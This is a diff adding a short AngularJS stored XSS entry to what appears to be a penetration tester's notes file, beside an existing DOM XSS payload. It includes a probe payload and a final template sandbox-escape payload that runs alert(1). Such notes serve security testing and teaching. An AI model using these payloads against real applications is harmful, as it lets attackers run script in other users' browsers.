@@ -81,7 +81,13 @@ DOM XSS
 ""</script><script>alert('DOM XXS')</script>
     --> DOM of the page is broken and the script is getting executed.
     
-    
+ 
+ 
+AngularJS stored XSS vulnerability
+---------------------------------
+1. Usual payload in product name as '"><img src onerror=alert(1)>x{{7*7}}
+2. Output as '">x49
+Final payload: {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 SSRF
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
